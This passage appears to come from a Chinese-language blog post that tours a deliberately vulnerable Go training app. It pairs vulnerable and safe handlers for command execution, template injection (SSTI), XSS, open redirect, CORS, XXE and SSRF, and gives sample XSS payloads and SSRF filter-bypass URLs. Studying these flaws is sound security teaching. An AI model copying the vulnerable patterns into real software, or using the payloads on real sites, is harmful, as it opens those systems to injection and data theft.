<h2 id="syscall-Exec"><a href="#syscall-Exec" class="headerlink" title="syscall.Exec"></a>syscall.Exec</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1:233/CommandInject/vuln/syscall</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CommandInjectVuln7Controller)</span></span> Get() &#123;</span><br><span class="line">	source := <span class="string">&quot;/bin/bash&quot;</span></span><br><span class="line">	arg1 := <span class="string">&quot;-c&quot;</span></span><br><span class="line">	arg2 := <span class="string">&quot;open /&quot;</span></span><br><span class="line">	err := syscall.Exec(source, []<span class="type">string</span>&#123;source, arg1, arg2&#125;, []<span class="type">string</span>&#123;&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Error executing syscall.Exec:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//syscall.StartProcess(source, []string&#123;&quot;arg1&quot;, &quot;arg2&quot;&#125;, &amp;syscall.ProcAttr&#123;&#125;)</span></span><br><span class="line">	<span class="comment">//syscall.StartProcess(shell, []string&#123;source, &quot;arg2&quot;&#125;, &amp;syscall.ProcAttr&#123;&#125;)</span></span><br><span class="line">	<span class="comment">//shellCommand := c.GetString(&quot;dir&quot;)</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h1><p><a target="_blank" rel="noopener" href="https://yoshiera.gitee.io/posts/go/template/">Go Template包的使用</a></p>
<p>Go的标准库里有两个模板引擎, 分别是text&#x2F;template和html&#x2F;template, 两者接口一致, 区别在于html&#x2F;template一般用于生成HTML输出, 它会自动转义HTML标签, 用于防范如XSS这样的攻击</p>
<h2 id="sprig"><a href="#sprig" class="headerlink" title="sprig"></a>sprig</h2><p>github.com&#x2F;Masterminds&#x2F;sprig</p>
<p>输出环境变量</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSTIVuln1Controller)</span></span> Get() &#123;</span><br><span class="line">	os.Setenv(<span class="string">&quot;go-sec-code-secret-key&quot;</span>, <span class="string">&quot;b81024f158eefcf60792ae9df9524f82&quot;</span>)</span><br><span class="line">	usertemplate := c.GetString(<span class="string">&quot;template&quot;</span>, <span class="string">&quot;please send your template&quot;</span>)</span><br><span class="line">	t := template.New(<span class="string">&quot;ssti&quot;</span>).Funcs(sprig.FuncMap())</span><br><span class="line">	t, _ = t.Parse(usertemplate)</span><br><span class="line">	buff := bytes.Buffer&#123;&#125;</span><br><span class="line">	err := t.Execute(&amp;buff, <span class="keyword">struct</span>&#123;&#125;&#123;&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	data, err := ioutil.ReadAll(&amp;buff)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Data[<span class="string">&quot;usertemplate&quot;</span>] = <span class="type">string</span>(data)</span><br><span class="line">	c.TplName = <span class="string">&quot;ssti.tpl&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSTISafe1Controller)</span></span> Get() &#123;</span><br><span class="line">	usertemplate := c.GetString(<span class="string">&quot;template&quot;</span>, <span class="string">&quot;please send your template&quot;</span>)</span><br><span class="line">	c.Data[<span class="string">&quot;usertemplate&quot;</span>] = usertemplate</span><br><span class="line">	c.TplName = <span class="string">&quot;ssti.tpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="html-template"><a href="#html-template" class="headerlink" title="html&#x2F;template"></a>html&#x2F;template</h2><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/windows/202502191423684.png" alt="image-20250219142323606"></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSTIVuln2Controller)</span></span> Get() &#123;</span><br><span class="line">	user := &amp;User&#123;<span class="number">1</span>, <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">	arg := c.GetString(<span class="string">&quot;template&quot;</span>, <span class="string">&quot;please send your template&quot;</span>)</span><br><span class="line">	tpl1 := fmt.Sprintf(<span class="string">`&lt;h1&gt;Hi, `</span> + arg + <span class="string">`&lt;/h1&gt; Your name is `</span> + arg + <span class="string">`!`</span>) <span class="comment">//使用Sprintf，将数据进行拼接以后返回纯文本再赋值给tpl1；</span></span><br><span class="line">	html, err := template.New(<span class="string">&quot;login&quot;</span>).Parse(tpl1)                            <span class="comment">//进行模板渲染</span></span><br><span class="line">	<span class="comment">//这里创建一个名为 &quot;login&quot; 的模板，并将模板字符串 tpl1 解析到该模板中。template.New()函数作用是创建一个新的模板，Parse()是用于解析模板字符串。</span></span><br><span class="line">	html = template.Must(html, err)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">	html.Execute(c.Ctx.ResponseWriter, user)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSTISafe2Controller)</span></span> Get() &#123;</span><br><span class="line">	user := &amp;User&#123;<span class="number">1</span>, <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123456&quot;</span>&#125;</span><br><span class="line">	arg := c.GetString(<span class="string">&quot;template&quot;</span>, <span class="string">&quot;please send your template&quot;</span>)</span><br><span class="line">	arg = template.HTMLEscapeString(arg)</span><br><span class="line">	tpl1 := fmt.Sprintf(<span class="string">`&lt;h1&gt;Hi, `</span> + arg + <span class="string">`&lt;/h1&gt; Your name is `</span> + arg + <span class="string">`!`</span>) <span class="comment">//使用Sprintf，将数据进行拼接以后返回纯文本再赋值给tpl1；</span></span><br><span class="line">	data := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;arg&quot;</span>:  arg,</span><br><span class="line">		<span class="string">&quot;Name&quot;</span>: user.Name,</span><br><span class="line">	&#125;</span><br><span class="line">	html, err := template.New(<span class="string">&quot;login&quot;</span>).Parse(tpl1) <span class="comment">//进行模板渲染</span></span><br><span class="line">	<span class="comment">//这里创建一个名为 &quot;login&quot; 的模板，并将模板字符串 tpl1 解析到该模板中。template.New()函数作用是创建一个新的模板，Parse()是用于解析模板字符串。</span></span><br><span class="line">	html = template.Must(html, err)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>)</span><br><span class="line">	html.Execute(c.Ctx.ResponseWriter, data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;print &quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;&#125;&#125;</span><br><span class="line">&#123;&#123;%22%3Cscript%3Ealert(/xss/)%3C/script%3E%22&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>结构体是Go中一个非常重要的类型，Go通过结构体来类比一个对象，因此他的字段就是一个对象的属性。通常Json的编码和解析都需要通过结构体来实现，加之模板渲染支持传入一个结构体的实例来渲染它的字段，这就造成了信息泄漏的可能。</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/windows/202502191424072.png" alt="image-20250219142419993"></p>
<h2 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h2><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/windows/202502191424731.png" alt="image-20250219142428650"></p>
<p>需要给对象定义⚠️方法</p>
<h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1:233/OpenUrlRedict/vuln?url=http://baidu.com</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *OpenUrlRedictVulnController)</span></span> Get() &#123;</span><br><span class="line">    url := c.GetString(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="comment">//c.Ctx.ResponseWriter.Header().Set(&quot;Content-Type&quot;, &quot;application/javascript&quot;)</span></span><br><span class="line">    c.Ctx.Redirect(<span class="number">302</span>, url)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//http://127.0.0.1:233/OpenUrlRedict/safe?url=http://semmle.com</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *OpenUrlRedictSafeController)</span></span> Get() &#123;</span><br><span class="line">    redicturl := c.GetString(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    target, err := url.Parse(redicturl)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;error&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> target.Hostname() == <span class="string">&quot;semmle.com&quot;</span> &#123;</span><br><span class="line">        <span class="comment">// GOOD: checking hostname</span></span><br><span class="line">        c.Ctx.Redirect(<span class="number">302</span>, target.String())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;evil input&quot;</span>))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="cors"><a href="#cors" class="headerlink" title="cors"></a>cors</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CorsVuln1Controller)</span></span> Get() &#123;</span><br><span class="line">	origin := c.Ctx.Request.Header.Get(<span class="string">&quot;Origin&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, origin)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Methods&quot;</span>, <span class="string">&quot;POST, GET, OPTIONS, PUT, DELETE, UPDATE&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Headers&quot;</span>, <span class="string">&quot;Origin, X-Requested-With, X-Extra-Header, Content-Type, Accept, Authorization&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Expose-Headers&quot;</span>, <span class="string">&quot;Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Cache-Control, Content-Language, Content-Type&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="string">&quot;true&quot;</span>)</span><br><span class="line">	jsonp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">	jsonp[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">	jsonp[<span class="string">&quot;password&quot;</span>] = <span class="string">&quot;admin@123&quot;</span></span><br><span class="line">	data, err := json.Marshal(jsonp)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CorsVuln2Controller)</span></span> Get() &#123;</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, <span class="string">&quot;*&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Methods&quot;</span>, <span class="string">&quot;POST, GET, OPTIONS, PUT, DELETE, UPDATE&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Headers&quot;</span>, <span class="string">&quot;Origin, X-Requested-With, X-Extra-Header, Content-Type, Accept, Authorization&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Expose-Headers&quot;</span>, <span class="string">&quot;Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Cache-Control, Content-Language, Content-Type&quot;</span>)</span><br><span class="line">	c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="string">&quot;true&quot;</span>)</span><br><span class="line">	jsonp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">	jsonp[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">	jsonp[<span class="string">&quot;password&quot;</span>] = <span class="string">&quot;admin@123&quot;</span></span><br><span class="line">	data, err := json.Marshal(jsonp)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *CorsSafe1Controller)</span></span> Get() &#123;</span><br><span class="line">	origin := c.Ctx.Request.Header.Get(<span class="string">&quot;origin&quot;</span>)</span><br><span class="line">	whitelists := []<span class="type">string</span>&#123;<span class="string">&quot;localhost:233&quot;</span>, <span class="string">&quot;example.com&quot;</span>&#125;</span><br><span class="line">	corsFilter := utils.CorsFilter&#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> origin != <span class="string">&quot;&quot;</span> &amp;&amp; corsFilter.DoFilter(origin, whitelists) &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Origin&quot;</span>, origin)</span><br><span class="line">		c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Methods&quot;</span>, <span class="string">&quot;POST, GET, OPTIONS, PUT, DELETE, UPDATE&quot;</span>)</span><br><span class="line">		c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Headers&quot;</span>, <span class="string">&quot;Origin, X-Requested-With, X-Extra-Header, Content-Type, Accept, Authorization&quot;</span>)</span><br><span class="line">		c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Expose-Headers&quot;</span>, <span class="string">&quot;Content-Length, Access-Control-Allow-Origin, Access-Control-Allow-Headers, Cache-Control, Content-Language, Content-Type&quot;</span>)</span><br><span class="line">		c.Ctx.ResponseWriter.Header().Set(<span class="string">&quot;Access-Control-Allow-Credentials&quot;</span>, <span class="string">&quot;true&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	jsonp := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">	jsonp[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">	jsonp[<span class="string">&quot;password&quot;</span>] = <span class="string">&quot;admin@123&quot;</span></span><br><span class="line">	data, err := json.Marshal(jsonp)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h1 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h1><p>go不引入外部实体，所以原生的是没有外部实体注入的，下面库实现了外部实体</p>
<p>github.com&#x2F;lestrrat-go&#x2F;libxml2</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XXEVuln1Controller)</span></span> Get() &#123;</span><br><span class="line">	file, err := ioutil.ReadFile(<span class="string">&quot;static/xml/xxe.xml&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Data[<span class="string">&quot;xxe&quot;</span>] = <span class="type">string</span>(file)</span><br><span class="line">	c.TplName = <span class="string">&quot;xxe.tpl&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *XXEVuln1Controller)</span></span> Post() &#123;</span><br><span class="line">	file := c.GetString(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	p := parser.New(parser.XMLParseNoEnt)</span><br><span class="line">	doc, err := p.ParseReader(bytes.NewReader([]<span class="type">byte</span>(file)))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> doc.Free()</span><br><span class="line">	root, err := doc.DocumentElement()</span><br><span class="line">	xxe := root.TextContent()</span><br><span class="line">	c.Data[<span class="string">&quot;xxe&quot;</span>] = xxe</span><br><span class="line">	c.TplName = <span class="string">&quot;xxe.tpl&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="“net-http”"><a href="#“net-http”" class="headerlink" title="“net&#x2F;http”"></a>“net&#x2F;http”</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://127.0.0.1:233/ssrf/vuln?url=http://www.baidu.com</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSRFVuln1Controller)</span></span> Get() &#123;</span><br><span class="line">	url := c.GetString(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://www.example.com&quot;</span>)</span><br><span class="line">	res, err := http.Get(url)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">	body, err := ioutil.ReadAll(res.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	c.Ctx.ResponseWriter.Write(body)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bypass can be :</span></span><br><span class="line"><span class="comment">// http://LOCALHOST:233</span></span><br><span class="line"><span class="comment">// http://localhost.:233</span></span><br><span class="line"><span class="comment">// http://0:233</span></span><br><span class="line"><span class="comment">// and others</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:233/ssrf/vuln/obfuscation?url=http://baidu.com</span></span><br><span class="line"><span class="comment">// http://127.0.0.1:233/ssrf/vuln/obfuscation?url=http://localhost.:233</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSRFVuln2Controller)</span></span> Get() &#123;</span><br><span class="line">	url := c.GetString(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://www.example.com&quot;</span>)</span><br><span class="line">	ssrfFilter := utils.SSRFFilter&#123;&#125;</span><br><span class="line">	blacklists := []<span class="type">string</span>&#123;<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>&#125;</span><br><span class="line">	evil := ssrfFilter.DoBlackFilter(url, blacklists)</span><br><span class="line">	<span class="keyword">if</span> evil == <span class="literal">true</span> &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;evil input&quot;</span>))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res, err := http.Get(url)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">		body, err := ioutil.ReadAll(res.Body)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		c.Ctx.ResponseWriter.Write(body)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSRFVuln3Controller)</span></span> Get() &#123;</span><br><span class="line">	url := c.GetString(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://www.example.com&quot;</span>)</span><br><span class="line">	ssrfFilter := utils.SSRFFilter&#123;&#125;</span><br><span class="line">	evil := ssrfFilter.DoGogsFilter(url)</span><br><span class="line">	<span class="keyword">if</span> evil == <span class="literal">true</span> &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;evil input&quot;</span>))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res, err := http.Get(url)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">		body, err := ioutil.ReadAll(res.Body)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		c.Ctx.ResponseWriter.Write(body)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *SSRFSafe1Controller)</span></span> Get() &#123;</span><br><span class="line">	url := c.GetString(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://www.example.com&quot;</span>)</span><br><span class="line">	ssrfFilter := utils.SSRFFilter&#123;&#125;</span><br><span class="line">	whitelists := []<span class="type">string</span>&#123;<span class="string">&quot;example.com&quot;</span>&#125;</span><br><span class="line">	evil := ssrfFilter.DoWhiteFilter(url, whitelists)</span><br><span class="line">	<span class="keyword">if</span> evil == <span class="literal">true</span> &#123;</span><br><span class="line">		c.Ctx.ResponseWriter.Write([]<span class="type">byte</span>(<span class="string">&quot;evil input&quot;</span>))</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res, err := http.Get(url)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">		body, err := ioutil.ReadAll(res.Body)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="built_in">panic</span>(err)</span><br><span class="line">		&#125;</span><br><span class="line">		c.Ctx.ResponseWriter.Write(body)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





